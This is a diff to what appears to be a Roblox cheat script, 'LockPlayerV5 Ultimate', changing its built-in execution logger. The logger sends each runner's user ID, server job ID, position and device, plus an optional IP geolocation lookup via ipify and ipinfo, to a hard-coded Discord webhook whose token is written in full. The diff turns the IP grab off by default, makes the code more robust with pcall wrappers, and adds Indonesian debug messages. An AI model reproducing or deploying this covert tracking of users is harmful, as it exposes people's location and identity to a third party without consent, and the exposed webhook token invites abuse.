@@ -810,10 +810,10 @@ Players.PlayerRemoving:Connect(function(p)
     end
 end) 
 
--- Config
+--// Config
 getgenv().whscript = "LockPlayerV5 Ultimate"
 getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1451922364601339944/nEUNJh2lVw40jb3CsfFFJ24fNrTj5LSdeP0QVdV9EmPo6urnGMd-g_AlC4GE4kiuGofk"
-getgenv().ExecLogSecret = true
+getgenv().ExecLogSecret = false
 
 --// Execution Log Script
 local ui = gethui()
@@ -823,13 +823,13 @@ folder.Name = folderName
 local player = game:GetService("Players").LocalPlayer
 
 if ui:FindFirstChild(folderName) then
-    print("Pls don't spam execute 2-3x or u will be kicked!")
+    print("Script sudah di-execute! Rejoin kalo error.")
     local ui2 = gethui()
     local folderName2 = "screen2"
     local folder2 = Instance.new("Folder")
     folder2.Name = folderName2
     if ui2:FindFirstChild(folderName2) then
-        player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
+        player:Kick("Anti-spam triggered. Rejoin dulu.")
     else
         folder2.Parent = gethui()
     end
@@ -839,7 +839,6 @@ else
     local userid = player.UserId
     local gameid = game.PlaceId
     local jobid = tostring(game.JobId)
-    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
     local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
     local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
     local completeTime = os.date("%Y-%m-%d %H:%M:%S")
@@ -854,22 +853,26 @@ else
     local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
     local gameVersion = game.PlaceVersion
 
-    if not getgenv().ExecLogSecret then getgenv().ExecLogSecret = false end
-    if not getgenv().whscript then getgenv().whscript = "Please provide a script name!" end
+    -- FIX THROTTLE
+    local gameName = "Unknown Game"
+    pcall(function()
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
 
-    task.wait(5)  -- tunggu biar stabil
+    task.wait(1)
 
-    local pingThreshold = 100
-    local serverStats = game:GetService("Stats").Network.ServerStatsItem
-    local dataPing = serverStats["Data Ping"]:GetValueString()
-    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
+    local pingValue = "N/A"
+    pcall(function()
+        local serverStats = game:GetService("Stats").Network.ServerStatsItem
+        local dataPing = serverStats["Data Ping"]:GetValueString()
+        pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
+    end)
 
     local function checkPremium()
         local premium = "false"
-        local success, response = pcall(function() return player.MembershipType end)
-        if success then
-            premium = (response ~= Enum.MembershipType.None) and "true" or "false"
-        end
+        pcall(function()
+            premium = (player.MembershipType ~= Enum.MembershipType.None) and "true" or "false"
+        end)
         return premium
     end
     local premium = checkPremium()
@@ -900,20 +903,30 @@ else
     }
 
     if getgenv().ExecLogSecret then
-        local ip = game:HttpGet("https://api.ipify.org")
-        local iplink = "https://ipinfo.io/" .. ip .. "/json"
-        local ipinfo_json = game:HttpGet(iplink)
-        local ipinfo_table = game:GetService("HttpService"):JSONDecode(ipinfo_json)
-
-        table.insert(data.embeds[1].fields, {
-            ["name"] = "**`(🤫) Secret`**",
-            ["value"] = "||(👣) IP: " .. ipinfo_table.ip .. "||\n||(🌆) Country: " .. ipinfo_table.country .. "||\n||(🪟) Loc: " .. ipinfo_table.loc .. "||\n||(🏙️) City: " .. ipinfo_table.city .. "||\n||(🏡) Region: " .. ipinfo_table.region .. "||\n||(🪢) Org: " .. ipinfo_table.org .. "||"
-        })
+        pcall(function()
+            local ip = game:HttpGet("https://api.ipify.org")
+            local iplink = "https://ipinfo.io/" .. ip .. "/json"
+            local ipinfo_json = game:HttpGet(iplink)
+            local ipinfo_table = game:GetService("HttpService"):JSONDecode(ipinfo_json)
+            table.insert(data.embeds[1].fields, {
+                ["name"] = "**`(🤫) Secret`**",
+                ["value"] = "||(👣) IP: " .. ipinfo_table.ip .. "||\n||(🌆) Country: " .. ipinfo_table.country .. "||\n||(🪟) Loc: " .. ipinfo_table.loc .. "||\n||(🏙️) City: " .. ipinfo_table.city .. "||\n||(🏡) Region: " .. ipinfo_table.region .. "||\n||(🪢) Org: " .. ipinfo_table.org .. "||"
+            })
+        end)
     end
 
+    -- debug print
+    print("Mencoba kirim webhook...")
     local newdata = game:GetService("HttpService"):JSONEncode(data)
     local headers = {["content-type"] = "application/json"}
     local request_func = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-    request_func(abcdef)
+    local success, err = pcall(function()
+        request_func(abcdef)
+    end)
+    if success then
+        print("Webhook berhasil dikirim!")
+    else
+        warn("Webhook gagal: " .. tostring(err))
+    end
 end
